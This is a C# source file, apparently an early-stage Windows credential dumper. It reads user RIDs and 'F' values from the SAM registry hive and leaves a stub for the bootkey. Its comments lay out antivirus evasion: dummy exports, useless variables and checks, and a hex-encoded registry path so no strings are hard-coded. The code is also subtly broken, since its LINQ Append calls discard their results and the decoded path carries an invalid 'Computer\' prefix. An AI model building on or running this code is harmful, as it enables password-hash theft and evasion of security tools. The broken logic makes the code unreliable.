using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;


// could export a bunch of different functions that do nothing ---> TODO
// export without name; only export ordinal ---> TODO
// use useless parameters
// dont store any important hard coded stirngs; get them from the environment
// useless checks and function calls 
// useless namespaces referrenced 


namespace DotNet_Dump
{
    internal class Program
    {
        static void Main(string[] args)
        {
            execute();
        }

        /* Main execution point
         * Input:
         *      N/A
         * Return:
         *      N/A
         * */
        static void execute()
        {
            int status = 0, uselessVar1 = 0x22501984;
            string key, uselessVar2 = "AC1599DEFFBAB3A5CDDD";
            string[] userRids, userValues;

            // Generate our key; continue to use and modify this key so we dont hard code it 
            key = genKey(uselessVar1, uselessVar2);
            if (key != null)
            {
                if (Environment.Is64BitProcess)
                {
                    status = 1 - 1;
                }
                else
                {
                    if (Environment.Is64BitOperatingSystem)
                    {
                        status = uselessVar1 - 0x22501984;
                    }
                }
            }

            // Grab all our user info
            status = grabUserInfo(key, out userRids, out userValues);




        }

        /* Generate the base key to list our users 
         * Input:
         *      uselessVar1 - useless :)
         *      uselessVar2 - useless :)
         * Return:
         *      The translated stirng key to our users on target
         * */
        static string genKey(in int uselessVar1, in string uselessVar2)
        {
            string key = "";
            // HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
            string users = "43 6f 6d 70 75 74 65 72 5c 48 4b 45 59 5f 4c 4f 43 41 4c 5f 4d 41 43 48 49 4e 45 5c 53 41 4d 5c 53 41 4d 5c 44 6f 6d 61 69 6e 73 5c 41 63 63 6f 75 6e 74 5c 55 73 65 72 73";
            string[] userBytes = users.Split(' ');

            // Translate
            foreach (string hex in userBytes)
            {
                int value = Convert.ToInt32(hex, 16);

                string stringValue = Char.ConvertFromUtf32(value);

                key.Append((char)value);
            }
                              
            RegistryKey openKey = Registry.LocalMachine.OpenSubKey(key);
           
            return key;
        }


        // Grab user RIDs + their F values
        static int grabUserInfo(in string key, out string[] userRids, out string[] userValues)
        {
            int status = 1, numUsers = 0;
            RegistryKey users;        

            // Open base users key
            users = Registry.LocalMachine.OpenSubKey(key);

            numUsers = users.SubKeyCount;

            userRids = new string[numUsers];

            userValues = new string[numUsers];

            foreach (string user in users.GetSubKeyNames())
            {
                RegistryKey currUser = users.OpenSubKey(user);

                userRids.Append(currUser.Name);

                userValues.Append(currUser.GetValue("F"));          
            }

            return status;
        }






        // Grab the bootkey





    }
}
